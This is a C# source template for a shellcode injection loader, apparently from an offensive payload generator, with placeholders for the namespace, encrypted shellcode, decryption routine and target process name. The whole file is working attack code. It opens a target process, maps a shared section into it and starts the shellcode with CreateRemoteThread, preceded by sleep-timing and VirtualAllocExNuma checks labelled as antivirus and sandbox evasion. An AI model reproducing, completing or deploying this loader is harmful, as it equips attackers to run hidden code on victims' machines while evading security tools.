using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace #NS#
{
    public class #CLASS#
    {
        private const uint #PROCESS_ALL_FLAGS# = 0x001F0FFF;
        private const uint #GENERIC_ALL# = 0x10000000;
        private const uint #PAGE_READWRITE# = 0x04;
        private const uint #PAGE_READEXECUTE# = 0x20;
        private const uint #PAGE_READWRITEEXECUTE# = 0x40;
        private const uint #SEC_COMMIT# = 0x08000000;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref uint MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        private static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        public static void Main(string[] args)
        {
            // AV evasion: Sleep and check
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 4.5) return;

            // Simple anti-sandbox
            IntPtr m = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (m == IntPtr.Zero) return;

            #SHELLCODE#
            
            #DECRYPTION#

            IntPtr lh = GetCurrentProcess();
            string t = #TARGET_PROC#;
            
            Process[] ps = Process.GetProcessesByName(t);
            if (ps.Length == 0) {
                Console.WriteLine("[-] Target process not found.");
                return;
            }
            int pid = ps[0].Id;

            IntPtr ph = OpenProcess(#PROCESS_ALL_FLAGS#, false, pid);
            if (ph == IntPtr.Zero) {
                Console.WriteLine("[-] Failed to open remote process.");
                return;
            }

            IntPtr sh = IntPtr.Zero;
            uint sz = (uint)#BUF#.Length;
            // Use PageReadWriteExecute (0x40) for the section itself
            uint status = NtCreateSection(ref sh, #GENERIC_ALL#, IntPtr.Zero, ref sz, #PAGE_READWRITEEXECUTE#, #SEC_COMMIT#, IntPtr.Zero);
            if (status != 0) {
                Console.WriteLine("[-] NtCreateSection failed: " + status);
                return;
            }

            IntPtr bal = IntPtr.Zero;
            ulong offl = 0;
            uint vsl = sz;
            status = NtMapViewOfSection(sh, lh, ref bal, IntPtr.Zero, IntPtr.Zero, out offl, out vsl, 2, 0, #PAGE_READWRITE#);
            if (status != 0) {
                Console.WriteLine("[-] NtMapViewOfSection (Local) failed: " + status);
                return;
            }

            IntPtr bar = IntPtr.Zero;
            ulong offr = 0;
            uint vsr = sz;
            status = NtMapViewOfSection(sh, ph, ref bar, IntPtr.Zero, IntPtr.Zero, out offr, out vsr, 2, 0, #PAGE_READEXECUTE#);
            if (status != 0) {
                Console.WriteLine("[-] NtMapViewOfSection (Remote) failed: " + status);
                return;
            }

            Marshal.Copy(#BUF#, 0, bal, #BUF#.Length);

            IntPtr hThread = CreateRemoteThread(ph, IntPtr.Zero, 0, bar, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero) {
                Console.WriteLine("[-] CreateRemoteThread failed.");
            } else {
                Console.WriteLine("[+] Injection successful!");
            }

            NtUnmapViewOfSection(lh, bal);
            NtClose(sh);
        }
    }
}
